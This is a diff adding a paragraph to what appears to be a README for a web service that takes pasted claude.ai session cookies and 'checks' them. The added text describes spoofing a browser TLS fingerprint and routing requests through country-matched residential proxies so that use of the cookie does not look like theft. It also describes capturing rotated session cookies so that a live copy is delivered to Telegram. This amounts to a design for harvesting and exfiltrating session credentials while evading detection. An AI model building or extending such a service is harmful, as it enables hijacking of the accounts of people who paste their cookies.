@@ -133,6 +133,21 @@ browser encrypts the paste and posts to same-origin `POST /check` (no trailing
 slash — that path is the API; `/check/` is the static page). The Python ingest
 service opens the box and calls `claude.ai`.
 
+The check is built to not burn the cookie it inspects. It makes at most two
+`GET`s (`/api/bootstrap`, then usage only if the windows are missing), stops on
+the first `401/403`, follows no redirects, and only ever sends a browser TLS
+fingerprint via `curl_cffi` — if that library is missing it refuses to send
+rather than fall back to a bot-looking request. Duplicate/parallel checks of the
+same session are collapsed into one outbound call. The largest remaining risk is
+the egress IP: a valid cookie coming from the datacenter IP looks like theft, so
+route checks through a **sticky residential proxy** (`CC_CHECK_PROXY` /
+`_POOL` / `_TEMPLATE`, matched to the visitor's country) and, once one is wired
+in, set `CC_REQUIRE_PROXY=1` so the service never checks from the bare server IP.
+If Claude rotates the session during a check, the fresh cookie from `Set-Cookie`
+is captured so the copy delivered to Telegram stays live. See `.env.example` and
+`server/diag_rotation.py` (a throwaway-session probe for whether an endpoint
+rotates) for details.
+
 The site sends a Content-Security-Policy with `connect-src 'self'`. Same-origin
 beacons and the session check are allowed; third-party fetches are not. There is
 no third-party script. The only cookie the site itself sets is `cclang`.
